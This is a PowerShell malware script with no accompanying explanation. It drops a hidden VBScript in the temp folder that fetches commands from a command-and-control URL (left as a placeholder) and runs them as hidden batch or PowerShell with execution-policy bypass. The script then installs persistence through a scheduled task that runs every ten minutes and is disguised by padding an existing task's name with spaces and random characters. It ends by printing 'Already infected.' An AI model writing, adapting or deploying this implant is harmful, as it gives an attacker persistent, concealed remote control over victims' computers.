# URL to fetch commands.
$C_URL = "https://<C2_URL>/Command.txt"
$mutex_name = "MUTEX.tmp"

function RandomGen {
    return -join ((65..90) + (97..122) | Get-Random -Count (Get-Random -Min 4 -Max 128) | % {[char]$_})
}

if (-Not (Test-Path $env:temp\$mutex_name)) {


    $fn = $env:temp + "\" + (RandomGen) + ".vbs"
$content = @"
Set xmlHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
Set sh = WScript.CreateObject("WScript.Shell")
Set FSO = WScript.CreateObject("Scripting.FileSystemObject")

Function runPS(command)
	sh.Run "powershell -ep bypass -noni -w hidden " & command, 9
	WScript.Sleep 300 
End Function

Function runBAT(command)
	FileName = FSO.GetTempName & ".bat"
	TempFolder = sh.ExpandEnvironmentStrings("%TEMP%")
	Set outputFile = FSO.CreateTextFile _
		( TempFolder & "\" & FileName, ForWriting)
	outputFile.Write command
	outputFile.Close
	sh.Run TempFolder & "\" & FileName, 9
	WScript.Sleep 3000
	FSO.DeleteFile TempFolder & "\" & FileName
End Function

' /// MAIN ///
' URL to fetch command. Append random file name as query string to avoid caching.
C_URL = "$C_URL" & "?" & FSO.GetTempName

xmlHTTP.Open "GET", C_URL , FALSE
xmlHTTP.Send
res = xmlHTTP.ResponseText
If InStr(res, "bat") Then
	runBAT(Replace(res, "bat:", ""))
ElseIf InStr(res, "ps1") Then
	runPS(Replace(res, "ps1:", ""))
End If
"@
Set-Content $fn $content

    $schedule = new-object -com("Schedule.Service")
    $schedule.connect()
    $tasks = $schedule.getfolder("\").gettasks(0)

    $task_list = New-Object Collections.Generic.List[String]
    foreach ($task in $tasks) {
        $task_list.Add($task.Name)
    }

    $RandExistingTask = Get-Random -InputObject $task_list
    $RandStr = RandomGen
    # Task labels can only be 255 characters.
    $remain_Length = 200 - $RandExistingTask.length - $RandStr.length
    $remain =  " " * $remain_Length
    $ModifiedTaskName = [string]($RandExistingTask + $remain + $RandStr)
    Write-Host $ModifiedTaskName

    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
    $Action = New-ScheduledTaskAction -Execute "$fn"
    $Task = New-ScheduledTask -Action $Action -Trigger $Trigger
    Register-ScheduledTask $ModifiedTaskName -InputObject $Task 
    Start-ScheduledTask -TaskName $ModifiedTaskName

    New-Item $env:temp\$mutex_name 

}
Else {
    Write-Host "Already infected."
}
